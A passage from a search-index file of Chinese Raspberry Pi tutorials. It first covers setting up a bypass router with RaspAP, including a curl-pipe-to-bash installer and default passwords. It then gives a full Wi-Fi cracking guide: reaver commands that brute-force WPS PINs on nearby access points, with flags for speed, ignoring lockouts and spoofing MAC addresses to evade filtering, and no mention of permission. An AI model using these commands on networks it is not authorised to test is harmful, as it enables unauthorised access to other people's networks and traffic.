\u7684\u65b9\u5f0f\u8fde\u63a5\u5230\u6811\u8393\u6d3e\u3002","title":"\u8ba9\u6811\u8393\u6d3e\u8054\u7f51"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE4%E5%8F%98%E8%BA%AB%E6%97%81%E8%B7%AF%E7%94%B1/#ap","text":"\u5b89\u88c5 RaspAP \uff0c\u8ba9\u6811\u8393\u6d3e\u62e5\u6709\u6f02\u4eae\u7684\u7f51\u7edc\u7ba1\u7406\u754c\u9762\uff1a curl -sL https://install.raspap.com | bash \u5b89\u88c5\u8fc7\u7a0b\u4e2d\u4f1a\u6709\u4e00\u4e9b\u9009\u9879\uff0c\u6839\u636e\u4f60\u7684\u9700\u8981\u6765\u9009\u62e9\u5373\u53ef\uff0c\u65e0\u8bba\u4f5c\u51fa\u4f55\u79cd\u9009\u62e9\u5747\u4e0d\u4f1a\u5f71\u54cd\u6811\u8393\u6d3e\u53d8\u8eab\u4e3a\u65c1\u8def\u7531\u3002 \u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u6267\u884c telinit 6 \uff0c\u91cd\u542f\u8bbe\u5907\u3002 \u91cd\u542f\u5b8c\u6210\u5728\u6d4f\u89c8\u5668\u8f93\u5165 http://raspberrypi.local/ \u8bbf\u95ee\u7ba1\u7406\u754c\u9762\uff1a \u7528\u6237\u540d\uff1a admin \u5bc6 \u7801\uff1a secret \u767b\u5f55\u6210\u529f\u540e\u53ef\u4ee5\u770b\u5230\u5f53\u524d\u6811\u8393\u6d3e\u5df2\u7ecf\u5177\u5907WIFI\u70ed\u70b9\u529f\u80fd\u3002 \u5728 RaspAP \u7ba1\u7406\u754c\u9762\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0 WiFi client \u529f\u80fd\u65e0\u6cd5\u6b63\u5e38\u4f7f\u7528\u3002\u8fd9\u662f\u56e0\u4e3a\u76ee\u524d\u6211\u4eec\u7684AP\u5de5\u4f5c\u65b9\u5f0f\u662f eth0 \u63a5\u5165\uff0c wlan0 \u53d1\u51fa\u70ed\u70b9\u4fe1\u53f7\u3002 \u8fd9\u65f6\uff0c\u5982\u679c\u63d2\u5165\u7684\u662f\u6709\u7ebf\u7f51\u7edc\uff0c\u5176\u5b83\u8bbe\u5907\u641c\u7d22\u540d\u79f0\u4e3a raspi-webgui \u7684WIFI\uff0c\u8f93\u5165\u9ed8\u8ba4\u5bc6\u7801 ChangeMe \u5373\u53ef\u4e0a\u7f51\u3002\u8fd0\u884c\u6a21\u5f0f\u5982\u4e0a\u56fe\u3002","title":"\u8ba9\u6811\u8393\u6d3e\u5177\u5907AP\u529f\u80fd\uff08\u5f00\u70ed\u70b9\uff09"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE4%E5%8F%98%E8%BA%AB%E6%97%81%E8%B7%AF%E7%94%B1/#usb-otg","text":"\u5f53\u524d\u7684 USB OTG \u7f51\u5361\u4ecd\u7136\u662f 169.254.x.x \u4e00\u7c7b\u7684\u5730\u5740\uff0c\u662f\u65e0\u6cd5\u8fde\u63a5\u7f51\u7edc\u7684\u3002 \u7f16\u8f91 /etc/dhcpcd.conf \uff0c\u5728\u6700\u672b\u5c3e\u6dfb\u52a0\u5982\u4e0b\u914d\u7f6e\uff1a # OTG USB usb0 configuration interface usb0 static ip_address=192.168.130.1/24 static domain_name_server= \u751f\u6210 /etc/dnsmasq.d/usb0.conf \u6587\u4ef6\uff0c\u6dfb\u52a0\u5982\u4e0b\u914d\u7f6e\uff1a interface=usb0 dhcp-range=192.168.130.100,192.168.130.255,255.255.255.0,12h \u91cd\u542f dhcpcd \u548c dnsmasq \u670d\u52a1\u3002 sudo systemctl daemon-reload sudo systemctl restart dhcpcd sudo systemctl restart dnsmasq \u901a\u8fc7 ifconfig \u547d\u4ee4\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 usb0 \u7f51\u5361\u62e5\u6709\u4e86 192.168.130.1 \u8fd9\u4e2aIP\u5730\u5740\uff0c\u540c\u65f6\u4e0e\u4e4b\u76f8\u8fde\u7684\u7535\u8111\u4e5f\u83b7\u53d6\u5230\u4e86\u8be5\u7f51\u6bb5\u7684IP\u5730\u5740\u3002 \u5982\u679c\u73b0\u5728\u5c06\u7f51\u7ebf\u63d2\u5165\u5230\u6811\u8393\u6d3e\u6709\u7ebf\u7f51\u5361\uff0c\u5219 USB OTG \u7f51\u5361\u4e5f\u53ef\u4ee5\u4e0a\u7f51\u4e86\u3002\u867d\u7136 usb0 \u4e0e wlan0 \u4e0d\u5728\u540c\u4e00\u7f51\u6bb5\uff0c\u4f46\u662f\u4ed6\u4eec\u4e4b\u95f4\u7684\u8bbe\u5907\u662f\u53ef\u4ee5\u4e92\u76f8\u8bbf\u95ee\u7684\u3002\u6b64\u65f6\u7684\u8fd0\u884c\u6a21\u5f0f\u5982\u4e0b\uff1a","title":"\u8ba9USB OTG\u7f51\u5361\u4e5f\u80fd\u4e0a\u7f51"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE4%E5%8F%98%E8%BA%AB%E6%97%81%E8%B7%AF%E7%94%B1/#_2","text":"\u73b0\u5728\u6211\u4eec\u77e5\u9053\u5982\u4f55\u5c06\u6709\u7ebf\u7f51\u7edc\u5171\u4eab\u4e3a\u65e0\u7ebfWIFI\u4fe1\u53f7\u5e76\u5206\u4eab\u7ed9 USB OTG\u7f51\u5361 \u4f7f\u7528\u3002\u4e0d\u8fc7\u5f88\u591a\u65f6\u5019\u6211\u4eec\u5e76\u6ca1\u6709\u6709\u7ebf\u7f51\u7edc\u63a5\u5165\u7684\u6761\u4ef6\uff0c\u6211\u4eec\u9700\u8981\u8fdb\u884c\u65e0\u7ebf\u7f51\u7edc\u63a5\u5165\uff08\u672c\u6587\u91c7\u7528 \u5916\u63a5USB\u7f51\u5361 \u7684\u65b9\u5f0f\u5b9e\u73b0\uff09\uff0c\u7136\u540e\u5206\u4eab\u7ed9\u6709\u7ebf\u7f51\u5361 eth0 \u3001\u65e0\u7ebf\u70ed\u70b9 wlan0 \u3001OTG USB\u7f51\u5361 usb0 \u3002\u4e0d\u8fc7\uff0c\u7531\u4e8e\u65e0\u7ebf\u7f51\u7edc\u63a5\u5165\u901f\u7387\u8f83\u4f4e\uff0c\u4fdd\u7559\u6709\u9650\u7f51\u5361 eth0 \u4f5c\u4e3a\u63a5\u5165\u7f51\u53e3\uff08 WAN \u53e3\uff09\u66f4\u5177\u6709\u73b0\u5b9e\u610f\u4e49\uff0c\u56e0\u6b64\u672c\u6587\u4e0d\u518d\u63cf\u8ff0\u5982\u4f55\u5c06\u5176\u53d8\u4e3a LAN \u53e3\uff0c\u611f\u5174\u8da3\u7684\u5c0f\u4f19\u4f34\u53ef\u4ee5\u81ea\u5df1\u7814\u7a76\u7814\u7a76\u3002 \u6211\u4eec\u5e0c\u671b\u6811\u8393\u6d3e\u5177\u5907\u4e0b\u56fe\u7684\u8fd0\u884c\u6a21\u5f0f\uff1a \u6211\u4f7f\u7528\u5177\u5907\u53cc\u9891WIFI\u7684\u7f51\u4ef6AC6210\u7f51\u5361\uff0c\u5728\u6811\u8393\u6d3e\u4e0b\u514d\u9a71\u3002 \u63d2\u5165 USB\u65e0\u7ebf\u7f51\u5361 \uff0c\u6267\u884c ifconfig -a \u786e\u8ba4\u9a71\u52a8\u5b89\u88c5\u6b63\u5e38\uff0c\u786e\u8ba4\u7f51\u5361\u7f16\u53f7\u662f wlan1 \u3002\u5982\u4e0d\u51fa\u610f\u5916\uff0c\u7f51\u5361\u4f1a\u81ea\u52a8\u8fde\u4e0a\u4e4b\u524d\u8fde\u63a5\u8fc7\u7684WIFI\u3002 \u5c06 /var/www/html/includes/config.php \u6587\u4ef6\u4e2d\u7684 define('RASPI_WIFI_CLIENT_INTERFACE', 'wlan0') \u6539\u4e3a define('RASPI_WIFI_CLIENT_INTERFACE', 'wlan1') \u4fee\u6539 /etc/dhcpcd.conf \u6587\u4ef6\uff0c\u5728 wlan0 \uff08\u6ce8\u610f\u662f\u677f\u8f7d\u7f51\u5361 wlan0 \uff09\u7684\u914d\u7f6e\u6700\u540e\u9762\u52a0\u4e0a nohook wpa_supplicant \u3002\u4f8b\u5982\uff1a # RaspAP wlan0 configuration interface wlan0 static ip_address=10.3.141.1/24 static routers=10.3.141.1 static domain_name_server=9.9.9.9 1.1.1.1 nohook wpa_supplicant \u6700\u540e\u91cd\u542f hostapd \uff1a sudo systemctl restart hostapd.service \u5982\u4e00\u5207\u6b63\u5e38\uff0c\u5219 USB OTG \u7f51\u5361\u4ee5\u53caWIFI\u70ed\u70b9\u5747\u53ef\u6b63\u5e38\u8bbf\u95ee\u7f51\u7edc\u3002 \u5f53\u7136\uff0c\u4e5f\u6709\u5c0f\u4f19\u4f34\u53d1\u73b0\u65e0\u6cd5\u4e0a\u7f51\uff0c\u6392\u67e5\u65b9\u5f0f\u5982\u4e0b\uff1a route \u67e5\u770b\u5f53\u524d\u8bbe\u5907\u8def\u7531\u8868\u3002\u7ed3\u679c\u53ef\u80fd\u548c\u4e0b\u8ff0\u76f8\u4f3c\uff1a root@raspberrypi:~# route Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface default 10.3.141.1 0.0.0.0 UG 304 0 0 wlan0 default OpenWrt.lan 0.0.0.0 UG 305 0 0 wlan1 10.3.141.0 0.0.0.0 255.255.255.0 U 304 0 0 wlan0 192.168.100.0 0.0.0.0 255.255.255.0 U 305 0 0 wlan1 192.168.130.0 0.0.0.0 255.255.255.0 U 203 0 0 usb0 \u8fd9\u662f\u7531\u4e8e\u9ed8\u8ba4\u7f51\u5173\u4f18\u5148\u7ea7\u4e0d\u591f\u5bfc\u81f4\u65e0\u6cd5\u6b63\u5e38\u4e0a\u7f51\u3002 route add default gw \u6b63\u786e\u7684\u7f51\u5173\u5730\u5740 \u4fee\u6539\u540e\u5373\u53ef\u6b63\u5e38\u4e0a\u7f51\u3002 \u540c\u7406\uff0c\u6709\u7ebf\u7f51\u53e3 eth0 \u548cUSB\u65e0\u7ebf\u7f51\u5361 wlan1 \u90fd\u53ef\u4ee5\u4f5c\u4e3a WAN \u53e3\u63a5\u5165\u7f51\u7edc\uff0c\u800c\u5177\u4f53\u60f3\u9009\u62e9\u8c01\u6765\u4e0a\u7f51\uff0c\u53ea\u9700\u8981\u8c03\u6574\u8def\u7531\u7684\u4f18\u5148\u7ea7\u5373\u53ef\u3002 \u6309\u7167\u8f76\u54e5\u63d0\u4f9b\u7684\u4fee\u6539\u65b9\u6cd5\uff0c RaspAP \u539f\u672c\u7684\u529f\u80fd\u4e0d\u4f1a\u53d7\u5230\u5f71\u54cd\uff0c\u800c\u4e14\u9996\u9875\u8fd8\u80fd\u663e\u793a wlan1 \u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u53ef\u89c6\u5316\u914d\u7f6e wlan1 \u63a5\u5165\u7684\u65e0\u7ebf\u7f51\u7edc\uff0c\u662f\u4e0d\u662f\u5f88\u9177\u5462\uff1f\ud83d\ude0e","title":"\u8ba9\u6811\u8393\u6d3e\u5177\u5907\u65e0\u7ebf\u63a5\u5165\u529f\u80fd"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/","text":"\u6811\u8393\u6d3ewifi\u7834\u89e3[\u6574\u7406] \u786c\u4ef6\u73af\u5883 \u6811\u8393\u6d3eB+\u4e00\u4e2a\uff08\u6211\u7528\u7684\u662fdebian\u73af\u5883\uff09 PC\u4e00\u53f0\uff08\u6216\u5176\u5b83\u8bbe\u5907\u76f4\u63a5\u64cd\u4f5cPI\u5c31\u884c\uff09 \u65e0\u7ebf\u7f51\u5361\uff08\u80fd\u7528\u5c31\u884c\uff0c\u4e0d\u8fc7\u5f3a\u5927\u7684\u65e0\u7ebf\u7f51\u5361\u4f1a\u4e8b\u534a\u529f\u500d\uff0c\u6211\u7528\u76843070\uff09 Find\u6ce8\uff1a \u65e0\u7ebf\u7f51\u5361\u4e0d\u662f\u54ea\u4e2a\u90fd\u884c\uff0c\u9700\u8981\u652f\u6301\u76d1\u542c\u6a21\u5f0f\u624d\u53ef\u4ee5\uff0c\u652f\u6301\u5217\u8868\u53ef\u4ee5\u67e5\u770b\u8fd9\u91cc\uff1a https://wikidevi.com/wiki/Wireless_adapters/Chipset_table \u5b89\u88c5\u4f9d\u8d56\u5305 sudo apt-get install -y libpcap-dev libsqlite3-dev sqlite3 libpcap0.8-dev libssl-dev build-essential iw tshark subversion ethtool sudo apt-get install -y libnl-3-200 libnl-3-dev libnl-genl-3-dev libnl-genl-3-200 \u5b89\u88c5aircarck-ng svn co http://svn.aircrack-ng.org/trunk/ aircrack-ng cd aircrack-ng/ make sudo make install \u8fd8\u63d0\u793a\u4e86Run 'airodump-ng-oui-update' as root (or with sudo) to install or update Airodump-ng OUI file (Internet connection required). sudo airodump-ng-oui-update \u5b89\u88c5reaver wget http://reaver-wps.googlecode.com/files/reaver-1.4.tar.gz tar zxvf reaver-1.4.tar.gz cd reaver-1.4/src ./configure make sudo make install \u4ee5\u4e0a\u4e24\u4e2a\u8d44\u6e90\u5305\u90fd\u53ef\u4ee5\u5728\u8fd9\u91cc\u627e\u5230\uff1a \u767e\u5ea6\u7f51\u76d8\u5206\u4eab \u5982\u679c\u5b89\u88c5\u6210\u529f\u540e\uff0c\u4f1a\u6709 airmon-ng , airodump-ng , reaver \u7b49\u547d\u4ee4\u53ef\u7528\u3002 \u7834\u89e3\u6559\u7a0b sudo airmon-ng start wlan0 sudo airodump-ng mon0 \u6839\u636e\u4e0a\u9762\u7684airodump\u641c\u7d22\u5230\u7684\u65e0\u7ebf\u4fe1\u53f7\uff0c\u7136\u540e\u53ef\u4ee5\u6311\u4fe1\u53f7\u5f3a\u7684\u8fdb\u884c\u7834\u89e3\uff08\u6ce8\u610f\uff0c\u8981\u9009\u62e9\u5f00\u4e86WPS\u529f\u80fd\u7684\uff09 \u6ce8\u610f\u770b\u8fd9\u5f20\u5217\u8868\uff0c\u5217\u8868\u4e2d\u663e\u793a\u4e86\u4f60\u5468\u8fb9\u65e0\u7ebf\u7684\u76f8\u5173\u4fe1\u606f\u3002\u6ce8\u610f\u770b MB \u8fd9\u4e00\u5217\uff0c\u663e\u793a\u4e3a\" 54 \"\u3001\"54e. \"\u7b49\u7b49\uff0c\u8fd9\u8868\u793a\u4e86\u65e0\u7ebf\u5f53\u524d\u7684\u901f\u7387\u6a21\u5f0f\u4ee5\u53caWPS\u5f00\u542f\u72b6\u51b5\uff0c\u6211\u81ea\u5df1\u7684\u8def\u7531\u5668\u662f \"steve\"\uff0c\u6ce8\u610f\u770b\uff0c\u201d54e\u201c\u548c\u201d 54e. \u201c\u662f\u4e0d\u540c\u7684\uff0c\u591a\u4e86\u4e00\u4e2a \u70b9\uff0c\u8fd9\u4e2a\u70b9\u8868\u793a\u5f00\u542f\u4e86 wps\u6a21\u5f0f\u3002\u6240\u4ee5\u6211\u4eec\u4e0b\u9762\u5c31\u8fdb\u884cwps\u7684\u63a2\u6d4b\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u8981\u8bb0\u4f4fSSID\u5bf9\u5e94\u7684MAC\u5730\u5740\uff0c\u6b64\u540e\u6211\u4eec\u4f1a\u9488\u5bf9MAC\u5730\u5740\u8fdb\u884c\u653b\u51fb\u548c\u63a2\u6d4b\u3002 sudo reaver -i mon0 -b 00:00:00:00:00:00 -a -S -vv -d2 -t 5 -c 11 -vv \u662f\u67e5\u770b\u8be6\u7ec6\u4fe1\u606f\u7684\uff0c\u7b49\u4f60\u719f\u7ec3\u4e86\u4e4b\u540e\uff0c\u4f60\u5c31\u53ef\u4ee5\u4f7f\u7528 -v \uff0c\u8fd9\u6837\u5c31\u7b80\u5355\u4e86\u3002\u901a\u5e38\uff0c\u9047\u5230\u95ee\u9898\u624d\u4f1a\u4f7f\u7528 -vv \u3002 \u5982\u679c\u60f3\u6302\u673a\u7834\u89e3\uff0c\u8bb0\u5f97\u52a0\u4e0anohup\u547d\u4ee4\u540e\uff0c\u53ef\u4ee5\u65ad\u5f00ssh\u3002\u7136\u540e\u5269\u4e0b\u5c31\u662f\u7b49\u5f85\u3002 nohup sudo reaver -i mon0 -b 00:00:00:00:00:00 -a -S -vv -d2 -t 5 -c 11 -o fbi & -o \u53c2\u6570\u662f\u8f93\u51fa\u5230\u6587\u4ef6 \u5982\u679c\u7834\u89e3\u6210\u529f\u540e\uff0c\u6253\u5f00\u8f93\u51fa\u7684\u65e5\u5fd7\uff0c\u5c31\u53ef\u4ee5\u770b\u5230reaver\u51fa\u6765\u7684\u5bc6\u7801\u3002 \u547d\u4ee4\u8bf4\u660e\uff1a reaver \u4f7f\u7528\u65b9\u6cd5\uff1a airmon-ng start wlan0 //\u542f\u52a8mon0\u76d1\u63a7 reaver -i mon0 -b MAC -a -S -vv //\u666e\u901a\u7528\u6cd5 \u5982\u679c\uff0c90.9%\u8fdb\u7a0b\u540e\u6b7b\u673a\u6216\u505c\u673a\uff0c\u8bf7\u8bb0\u4e0bPIN\u524d\u56db\u4f4d\u6570\uff0c\u7528\u6307\u4ee4\uff1a reaver -i mon0 -b MAC -a -vv -p XXXX(PIN\u524d\u56db\u4f4d\u6570) \u5176\u4ed6\u547d\u4ee4 airodump-ng mon0 \u7528\u6765\u626b\u63cf\u5468\u56f4\u65e0\u7ebf\u4fe1\u53f7 wash -i mon0 -C \u8fd9\u4e2a\u662f\u7528\u6765\u68c0\u6d4b\u5468\u56f4\u65e0\u7ebf\u652f\u6301PIN\u7684\u8def\u7531 \u5982\u679c\u4e00\u76f4pin\u4e0d\u52a8\uff0c\u5c1d\u8bd5\u52a0-N\u53c2\u6570 reaver -i mon0 -b xx:xx:xx:xx:xx:xx -d 0 -vv -a -S -N \u4e5f\u53ef\u4ee5\u52a0\u5ef6\u65f6 -t 3 -b 3 \u5e38\u7528\u53c2\u6570\u91ca\u7591 -i \u76d1\u542c\u540e\u63a5\u53e3\u540d\u79f0 \u7f51\u5361\u7684\u76d1\u89c6\u63a5\u53e3\uff0c\u901a\u5e38\u662fmon0 -b \u76ee\u6807mac\u5730\u5740 AP\u7684MAC\u5730\u5740 -a \u81ea\u52a8\u68c0\u6d4b\u76ee\u6807AP\u6700\u4f73\u914d\u7f6e -S \u4f7f\u7528\u6700\u5c0f\u7684DH key\uff0c\u53ef\u4ee5\u63d0\u9ad8PJ\u901f\u5ea6 -vv \u663e\u793a\u66f4\u591a\u7684\u975e\u4e25\u91cd\u8b66\u544a -d \u5373delay\u6bcf\u7a77\u4e3e\u4e00\u6b21\u7684\u95f2\u7f6e\u65f6\u95f4 \u9884\u8bbe\u4e3a1\u79d2 reaver -i mon0 -b MAC -d 0 \u7528\u4e0a\u8ff0\u6307\u4ee4\u53ef\u4ee5\u5927\u5e45\u52a0\u5febPJ\u901f\u5ea6 \u4f46\u662f\u6709\u4e9bAP\u53ef\u80fd\u53d7\u4e0d\u4e86 -c \uff08\u540e\u8ddf\u9891\u9053\u6570\uff09 \u6307\u5b9a\u9891\u9053,\u53ef\u4ee5\u65b9\u4fbf\u627e\u5230\u4fe1\u53f7 -p PIN\u7801\u56db\u4f4d\u6216\u516b\u4f4d //\u5df2\u77e5pin\u7801\u524d4\u4f4d\u53ef\u4ee5\u5e26\u6b64\u53c2\u6570\uff0c\u6307\u5b9a\u4ece\u8fd9\u4e2a\u6570\u5b57\u5f00\u59cbpin\u3002\u53ef\u4ee5\u75288\u4f4d\u76f4\u63a5\u627e\u5230\u5bc6\u7801\u3002 -N \u4e0d\u53d1\u9001NACK\u4fe1\u606f\uff08\u5982\u679c\u4e00\u76f4pin\u4e0d\u52a8\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u8fd9\u4e2a\u53c2\u6570\uff09 -n \u5bf9\u76ee\u6807AP\u603b\u662f\u53d1\u9001NACK\uff0c\u9ed8\u8ba4\u81ea\u52a8 -t \u5373timeout\u6bcf\u6b21\u7a77\u4e3e\u7b49\u5f85\u53cd\u9988\u7684\u6700\u957f\u65f6\u95f4\uff0c\u5982\u679c\u4fe1\u53f7\u4e0d\u9519\uff0c\u53ef\u4ee5\u8fd9\u6837###\u8bbe\u7f6e reaver -i mon0 -b MAC -d 0 -t .5 -m, --mac= \u6307\u5b9a\u672c\u673aMAC\u5730\u5740\uff0c\u5728AP\u6709MAC\u8fc7\u6ee4\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528 \u5c0f\u7ed3-PJ\u65f6\u5e94\u56e0\u72b6\u51b5\u8c03\u6574\u53c2\u6570: \u4fe1\u53f7 \u975e\u5e38\u597d: reaver -i mon0 -b MAC -a -S -vv -d 0 -c 1 \u4fe1\u53f7\u666e\u901a: reaver -i mon0 -b MAC -a -S -vv -d .5 -t .5 -c 1 \u4fe1\u53f7\u4e00\u822c: reaver -i mon0 -b MAC -a -S -vv -c 1 \u5f53\u51fa\u73b0\u6709\u767e\u5206\u6570\u65f6\u4f60\u5c31\u53ef\u4ee5\u7528crtl+c\u6765\u6682\u505c\uff0c\u5b83\u4f1a\u5c06reaver\u7684\u8fdb\u5ea6\u8868\u6587\u4ef6\u4fdd\u5b58\u5728 1.3\u7248\uff1a /etc/reaver/MAC\u5730\u5740.wpc 1.4\u7248\uff1a /usr/local/etc/reaver/MAC\u5730\u5740.wpc \u7528\u8d44\u6e90\u7ba1\u7406\u5668\uff0c\u624b\u5de5\u5c06\u4ee5MAC\u5730\u5740\u547d\u540d\u7684\u3001\u540e\u8f8d\u4e3awpc\u7684\u6587\u4ef6\u62f7\u8d1d\u5230U\u76d8\u6216\u786c\u76d8\u4e2d\uff0c \u4e0b\u6b21\u91cd\u542f\u52a8\u540e\uff0c\u518d\u624b\u5de5\u590d\u5236\u5230/etc/reaver/ \u76ee\u5f55\u4e0b\u5373\u53ef\u3002 \u4e0d\u662f\u6240\u6709\u7684\u8def\u7531\u90fd\u652f\u6301pin\u5b66\u4e60\u3002AP\u5173\u95ed\u4e86WPS\u3001\u6216\u8005\u6ca1\u6709QSS\u6ef4\uff0c\u4f1a\u51fa\u73b0 WARNING: Failed to associate with XX:XX:XX:XX:XX:XX (ESSID: XXXX) \u5b66\u4e60\u8fc7\u7a0b\u4e2d\u4e5f\u53ef\u968f\u65f6\u968f\u5730\u6309Ctrl+C\u7ec8\u6b62PJ\uff0c\u91cd\u590d\u540c\u4e00\u4e2aPIN\u7801 \u6216 timeou t\u53ef\u7ec8\u6b62\uff0creaver\u4f1a\u81ea\u52a8\u4fdd\u5b58\u8fdb\u5ea6\u3002 \u7ee7\u7eed\u4e0a\u6b21\u7684PJ\uff0c\u5219\u518d\u6b21\u5728\u7ec8\u7aef\u4e2d\u53d1\u9001: reaver -i mon0 -b MAC -vv \u8fd9\u6761\u6307\u4ee4\u4e0b\u8fbe\u540e\uff0c\u4f1a\u8ba9\u4f60\u9009y\u6216n\uff0c\u9009y\u540e\u5c31\u7ee7\u7eed\u4e86 \u5f53reaver\u786e\u5b9a\u524d4\u4f4dPIN\u5bc6\u7801\u540e\uff0c\u5176\u5de5\u4f5c\u5b8c\u6210\u4efb\u52a1\u8fdb\u5ea6\u6570\u503c\u5c06\u76f4\u63a5\u8df3\u8dc3\u81f390.9%\u4ee5\u4e0a\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ea\u5269\u4f59\u4e00\u5343\u4e2a\u5bc6\u7801\u7ec4\u5408\u4e86\uff08\u603b\u5171\u4e00\u4e07\u4e00\u5343\u4e2a\u5bc6\u7801\uff09\u3002 \u53c2\u6570\u8be6\u7ec6\u8bf4\u660e: -m, --mac= MAC of the host system \u6307\u5b9a\u672c\u673aMAC\u5730\u5740\uff0c\u5728AP\u6709MAC\u8fc7\u6ee4\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528 -e, --essid= ESSID of the target AP \u8def\u7531\u5668\u7684ESSID\uff0c\u4e00\u822c\u4e0d\u7528\u6307\u5b9a -c, --channel= Set the 802.11 channel for the interface (implies -f) \u4fe1\u53f7\u7684\u9891\u9053\uff0c\u5982\u679c\u4e0d\u6307\u5b9a\u4f1a\u81ea\u52a8\u626b\u63cf -o, --out-file= Send output to a log file [stdout] \u6807\u51c6\u8f93\u51fa\u5230\u6587\u4ef6 -s, --session= Restore a previous session file \u6062\u590d\u8fdb\u7a0b\u6587\u4ef6 -C, --exec= Execute the supplied command upon successful pin recovery pin\u6210\u529f\u540e\u6267\u884c\u547d\u4ee4 -D, --daemonize Daemonize reaver \u8bbe\u7f6ereaver\u6210Daemon -a, --auto Auto detect the best advanced options for the target AP \u5bf9\u76ee\u6807AP\u81ea\u52a8\u68c0\u6d4b\u9ad8\u7ea7\u53c2\u6570 -f, --fixed Disable channel hopping \u7981\u6b62\u9891\u9053\u8df3\u8f6c -5, --5ghz Use 5GHz 802.11 channels \u4f7f\u75285G\u9891\u9053 -v, --verbose Display non-critical warnings (-vv for more) \u663e\u793a\u4e0d\u91cd\u8981\u8b66\u544a\u4fe1\u606f -vv \u53ef\u4ee5\u663e\u793a\u66f4\u591a -q, --quiet Only display critical messages \u53ea\u663e\u793a\u5173\u952e\u4fe1\u606f -h, --help Show help \u663e\u793a\u5e2e\u52a9 -vv \u663e\u793a\u66f4\u591a\u7684\u975e\u4e25\u91cd\u8b66\u544a \u9ad8\u7ea7\u53c2\u6570: -p, --pin= Use the specified 4 or 8 digit WPS pin \u76f4\u63a5\u8bfb\u53d6psk\uff08\u672c\u4eba\u6d4b\u8bd5\u672a\u6210\u529f\uff0c\u5efa\u8bae\u7528\u7f51\u5361\u81ea\u5e26\u8f6f\u4ef6\u83b7\u53d6\uff09 -d, --delay= Set the delay between pin attempts 1 pin\u95f4\u5ef6\u65f6\uff0c\u9ed8\u8ba41\u79d2\uff0c\u63a8\u8350\u8bbe0 -l, --lock-delay= Set the time to wait if the AP locks WPS pin attempts [60] AP\u9501\u5b9aWPS\u540e\u7b49\u5f85\u65f6\u95f4 -g, --max-attempts= Quit after num pin attempts \u6700\u5927pin\u6b21\u6570 -x, --fail-wait= Set the time to sleep after 10 unexpected failures [0] 10\u6b21\u610f\u5916\u5931\u8d25\u540e\u7b49\u5f85\u65f6\u95f4\uff0c\u9ed8\u8ba40\u79d2 -r, --recurring-delay= Sleep for y seconds every x pin attempts \u6bcfx\u6b21pin\u540e\u7b49\u5f85y\u79d2 -t, --timeout= Set the receive timeout period [5] \u6536\u5305\u8d85\u65f6\uff0c\u9ed8\u8ba45\u79d2 -T, --m57-timeout= Set the M5/M7 timeout period [0.20] M5/M7\u8d85\u65f6\uff0c\u9ed8\u8ba40.2\u79d2 -A, --no-associate Do not associate with the AP (association must be done by another application) \u4e0d\u8fde\u5165AP\uff08\u8fde\u5165\u8fc7\u7a0b\u5fc5\u987b\u6709\u5176\u4ed6\u7a0b\u5e8f\u5b8c\u6210\uff09 -N, --no-nacks Do not send NACK messages when out of order packets are received \u4e0d\u53d1\u9001NACK\u4fe1\u606f\uff08\u5982\u679c\u4e00\u76f4pin\u4e0d\u52a8\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u8fd9\u4e2a\u53c2\u6570\uff09 -S, --dh-small Use small DH keys to improve crack speed \u4f7f\u7528\u5c0fDH\u5173\u952e\u503c\u63d0\u9ad8\u901f\u5ea6\uff08\u63a8\u8350\u4f7f\u7528\uff09 -L, --ignore-locks Ignore locked state reported by the target AP \u5ffd\u7565\u76ee\u6807AP\u62a5\u544a\u7684\u9501\u5b9a\u72b6\u6001 -E, --eap-terminate Terminate each WPS session with an EAP FAIL packet \u6bcf\u5f53\u6536\u5230EAP\u5931\u8d25\u5305\u5c31\u7ec8\u6b62WPS\u8fdb\u7a0b -n, --nack Target AP always sends a NACK [Auto] \u5bf9\u76ee\u6807AP\u603b\u662f\u53d1\u9001NACK\uff0c\u9ed8\u8ba4\u81ea\u52a8 -w, --win7 Mimic a Windows 7 registrar [False] \u6a21\u62dfwin7\u6ce8\u518c\uff0c\u9ed8\u8ba4\u5173\u95ed Reference http://lok.me/a/1972.html http://bao3.blogspot.com/2013/05/raspberry-pi.html http://tieba.baidu.com/p/2682878857 http://www.nyaboron.moe/posts/606.html \u6587\u7ae0\u7248\u6743\u5f52 FindHao \u6240\u6709\u4e28\u672c\u7ad9\u9ed8\u8ba4\u91c7\u7528CC-BY-NC-SA 4.0\u534f\u8bae\u8fdb\u884c\u6388\u6743| \u8f6c\u8f7d\u5fc5\u987b\u5305\u542b\u672c\u58f0\u660e\uff0c\u5e76\u4ee5\u8d85\u94fe\u63a5\u5f62\u5f0f\u6ce8\u660e\u4f5c\u8005 FindHao \u548c\u672c\u6587\u539f\u59cb\u5730\u5740\uff1a https://www.findhao.net/easycoding/1184.html","title":"\u6811\u8393\u6d3ewifi\u7834\u89e3\u6574\u7406   FindHao"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#wifi","text":"","title":"\u6811\u8393\u6d3ewifi\u7834\u89e3[\u6574\u7406]"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_1","text":"\u6811\u8393\u6d3eB+\u4e00\u4e2a\uff08\u6211\u7528\u7684\u662fdebian\u73af\u5883\uff09 PC\u4e00\u53f0\uff08\u6216\u5176\u5b83\u8bbe\u5907\u76f4\u63a5\u64cd\u4f5cPI\u5c31\u884c\uff09 